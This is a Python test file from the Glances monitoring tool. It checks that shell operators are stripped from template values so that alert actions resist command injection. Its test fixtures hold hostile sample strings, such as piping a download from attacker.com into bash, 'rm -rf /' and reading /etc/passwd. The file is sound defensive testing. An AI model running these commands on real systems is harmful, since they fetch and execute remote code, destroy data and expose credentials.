#!/usr/bin/env python
#
# Glances - An eye on your system
#
# SPDX-FileCopyrightText: 2024 Nicolas Hennion <nicolas@nicolargo.com>
#
# SPDX-License-Identifier: LGPL-3.0-only
#

"""Glances unit tests for action command sanitization.

Tests cover:
- _sanitize_mustache_dict strips shell operators from string values
- Pipe (|), chain (&&), redirect (>, >>) injection via Mustache values
- Non-string values are preserved unchanged
- The sanitization integrates correctly with GlancesActions.run()
- secure_popen basic functionality
"""

import os
import tempfile
from unittest.mock import patch

import pytest

from glances.actions import GlancesActions, _sanitize_mustache_dict
from glances.secure import secure_popen

# Skip the whole module on Windows where echo -n behaves differently
pytestmark = pytest.mark.skipif(
    os.name == 'nt',
    reason='Shell command tests are POSIX-only',
)


# ---------------------------------------------------------------------------
# Tests – _sanitize_mustache_dict
# ---------------------------------------------------------------------------


class TestSanitizeMustacheDict:
    """Unit tests for _sanitize_mustache_dict."""

    def test_none_returns_none(self):
        assert _sanitize_mustache_dict(None) is None

    def test_empty_dict_returns_empty(self):
        assert _sanitize_mustache_dict({}) == {}

    def test_strips_pipe(self):
        d = {'name': 'innocent|curl evil.com'}
        safe = _sanitize_mustache_dict(d)
        assert '|' not in safe['name']
        assert safe['name'] == 'innocent curl evil.com'

    def test_strips_double_ampersand(self):
        d = {'name': 'web && curl evil.com'}
        safe = _sanitize_mustache_dict(d)
        assert '&&' not in safe['name']
        assert safe['name'] == 'web   curl evil.com'

    def test_strips_redirect(self):
        d = {'name': 'data > /etc/passwd'}
        safe = _sanitize_mustache_dict(d)
        assert '>' not in safe['name']
        assert safe['name'] == 'data   /etc/passwd'

    def test_strips_append_redirect(self):
        d = {'name': 'data >> /etc/shadow'}
        safe = _sanitize_mustache_dict(d)
        assert '>>' not in safe['name']
        assert safe['name'] == 'data   /etc/shadow'

    def test_strips_multiple_operators(self):
        d = {'name': 'foo|bar && baz > qux >> end'}
        safe = _sanitize_mustache_dict(d)
        assert '|' not in safe['name']
        assert '&&' not in safe['name']
        # >> is replaced first (before >), then remaining > is replaced
        for op in ('|', '&&', '>>', '>'):
            assert op not in safe['name']

    def test_preserves_int_values(self):
        d = {'cpu_percent': 95, 'name': 'safe'}
        safe = _sanitize_mustache_dict(d)
        assert safe['cpu_percent'] == 95

    def test_preserves_float_values(self):
        d = {'load': 3.14, 'name': 'safe'}
        safe = _sanitize_mustache_dict(d)
        assert safe['load'] == 3.14

    def test_preserves_none_values(self):
        d = {'key': None, 'name': 'safe'}
        safe = _sanitize_mustache_dict(d)
        assert safe['key'] is None

    def test_preserves_bool_values(self):
        d = {'is_up': True, 'name': 'safe'}
        safe = _sanitize_mustache_dict(d)
        assert safe['is_up'] is True

    def test_preserves_list_values(self):
        d = {'ports': [80, 443], 'name': 'safe'}
        safe = _sanitize_mustache_dict(d)
        assert safe['ports'] == [80, 443]

    def test_clean_string_unchanged(self):
        d = {'name': 'my-web-server', 'mnt_point': '/data/disk1'}
        safe = _sanitize_mustache_dict(d)
        assert safe['name'] == 'my-web-server'
        assert safe['mnt_point'] == '/data/disk1'

    def test_does_not_mutate_original(self):
        d = {'name': 'foo|bar'}
        _sanitize_mustache_dict(d)
        assert d['name'] == 'foo|bar'

    def test_returns_new_dict(self):
        d = {'name': 'foo'}
        safe = _sanitize_mustache_dict(d)
        assert safe is not d


# ---------------------------------------------------------------------------
# Tests – Command injection scenarios
# ---------------------------------------------------------------------------


class TestCommandInjectionPrevention:
    """Verify that crafted Mustache values cannot inject commands."""

    def test_pipe_injection_in_process_name(self):
        """Simulate: process name contains pipe to inject curl command."""
        mustache_dict = {
            'name': 'innocent|curl attacker.com/evil.sh|bash',
            'cpu_percent': 99.0,
        }
        safe = _sanitize_mustache_dict(mustache_dict)
        # The pipe characters must be gone
        assert '|' not in safe['name']
        assert 'curl' in safe['name']  # text is preserved, just operator removed

    def test_chain_injection_in_container_name(self):
        """Simulate: container name contains && to chain commands."""
        mustache_dict = {
            'name': 'web && curl attacker.com/rev.sh | bash && echo ',
            'Image': 'nginx:latest',
            'Id': 'abc123',
            'cpu': 95.0,
        }
        safe = _sanitize_mustache_dict(mustache_dict)
        assert '&&' not in safe['name']
        assert '|' not in safe['name']
        # Non-string fields untouched
        assert safe['cpu'] == 95.0

    def test_redirect_injection_in_mount_point(self):
        """Simulate: mount point contains redirect to overwrite files."""
        mustache_dict = {
            'mnt_point': '/data > /etc/crontab',
            'used': 900000,
            'size': 1000000,
        }
        safe = _sanitize_mustache_dict(mustache_dict)
        assert '>' not in safe['mnt_point']

    def test_append_redirect_injection(self):
        """Simulate: value contains >> to append to sensitive files."""
        mustache_dict = {
            'name': 'logger >> /etc/shadow',
        }
        safe = _sanitize_mustache_dict(mustache_dict)
        assert '>>' not in safe['name']


# ---------------------------------------------------------------------------
# Tests – secure_popen basic functionality
# ---------------------------------------------------------------------------


class TestSecurePopen:
    """Basic tests for secure_popen."""

    def test_simple_echo(self):
        assert secure_popen('echo -n TEST') == 'TEST'

    def test_chained_commands(self):
        assert secure_popen('echo -n A && echo -n B') == 'AB'

    def test_pipe(self):
        result = secure_popen('echo FOO | grep FOO')
        assert 'FOO' in result

    def test_redirect_to_file(self):
        with tempfile.NamedTemporaryFile(mode='r', suffix='.txt', delete=False) as f:
            tmpfile = f.name
        try:
            secure_popen(f'echo -n HELLO > {tmpfile}')
            with open(tmpfile) as f:
                assert f.read() == 'HELLO'
        finally:
            os.unlink(tmpfile)


# ---------------------------------------------------------------------------
# Tests – GlancesActions.run() integration
# ---------------------------------------------------------------------------


class TestActionsRunIntegration:
    """Verify that GlancesActions.run() uses sanitized mustache values."""

    @pytest.fixture
    def actions(self):
        """Create a GlancesActions instance with an expired start timer."""
        a = GlancesActions()
        # Force the start timer to be finished so actions can run immediately
        a.start_timer = type('FakeTimer', (), {'finished': lambda self: True})()
        return a

    def test_run_with_safe_values(self, actions):
        """Normal run with safe values should succeed."""
        result = actions.run(
            'cpu',
            'CRITICAL',
            ['echo -n {{name}}'],
            repeat=False,
            mustache_dict={'name': 'myprocess'},
        )
        assert result is True

    def test_run_sanitizes_pipe_in_mustache(self, actions):
        """Pipe in mustache value must not create a real pipe."""
        with patch('glances.actions.secure_popen') as mock_popen:
            mock_popen.return_value = ''
            actions.run(
                'cpu',
                'CRITICAL',
                ['echo {{name}}'],
                repeat=False,
                mustache_dict={'name': 'evil|rm -rf /'},
            )
            # The command passed to secure_popen should have | replaced
            called_cmd = mock_popen.call_args[0][0]
            assert '|' not in called_cmd
            assert 'evil' in called_cmd
            assert 'rm -rf /' in called_cmd  # text preserved, pipe removed

    def test_run_sanitizes_chain_in_mustache(self, actions):
        """&& in mustache value must not chain commands."""
        with patch('glances.actions.secure_popen') as mock_popen:
            mock_popen.return_value = ''
            actions.run(
                'containers',
                'WARNING',
                ['echo {{name}}'],
                repeat=False,
                mustache_dict={'name': 'web && cat /etc/passwd'},
            )
            called_cmd = mock_popen.call_args[0][0]
            assert '&&' not in called_cmd

    def test_run_sanitizes_redirect_in_mustache(self, actions):
        """> in mustache value must not redirect output."""
        with patch('glances.actions.secure_popen') as mock_popen:
            mock_popen.return_value = ''
            actions.run(
                'fs',
                'CRITICAL',
                ['echo {{mnt_point}}'],
                repeat=False,
                mustache_dict={'mnt_point': '/data > /etc/crontab'},
            )
            called_cmd = mock_popen.call_args[0][0]
            assert '>' not in called_cmd

    def test_run_preserves_template_operators(self, actions):
        """Operators in the template itself (not in values) must be preserved."""
        with patch('glances.actions.secure_popen') as mock_popen:
            mock_popen.return_value = ''
            # The template has a pipe, but the mustache value is clean
            actions.run(
                'cpu',
                'CRITICAL',
                ['echo {{name}} | grep something'],
                repeat=False,
                mustache_dict={'name': 'safe-process'},
            )
            called_cmd = mock_popen.call_args[0][0]
            # Template pipe is preserved
            assert '|' in called_cmd
            assert 'grep something' in called_cmd

    def test_run_preserves_template_redirect(self, actions):
        """Redirect in the template itself must be preserved."""
        with patch('glances.actions.secure_popen') as mock_popen:
            mock_popen.return_value = ''
            actions.run(
                'fs',
                'WARNING',
                ['echo {{mnt_point}} > /tmp/alert.log'],
                repeat=False,
                mustache_dict={'mnt_point': '/data/disk1'},
            )
            called_cmd = mock_popen.call_args[0][0]
            assert '>' in called_cmd
            assert '/tmp/alert.log' in called_cmd

    def test_run_preserves_template_chain(self, actions):
        """&& in the template itself must be preserved."""
        with patch('glances.actions.secure_popen') as mock_popen:
            mock_popen.return_value = ''
            actions.run(
                'cpu',
                'CRITICAL',
                ['echo {{name}} && echo done'],
                repeat=False,
                mustache_dict={'name': 'safe-process'},
            )
            called_cmd = mock_popen.call_args[0][0]
            assert '&&' in called_cmd

    def test_run_does_not_execute_when_already_triggered(self, actions):
        """Same criticality should not re-trigger if repeat=False."""
        actions.set('cpu', 'CRITICAL')
        result = actions.run(
            'cpu',
            'CRITICAL',
            ['echo test'],
            repeat=False,
            mustache_dict={},
        )
        assert result is False

    def test_run_repeats_when_repeat_true(self, actions):
        """Same criticality should re-trigger when repeat=True."""
        actions.set('cpu', 'CRITICAL')
        result = actions.run(
            'cpu',
            'CRITICAL',
            ['echo test'],
            repeat=True,
            mustache_dict={},
        )
        assert result is True
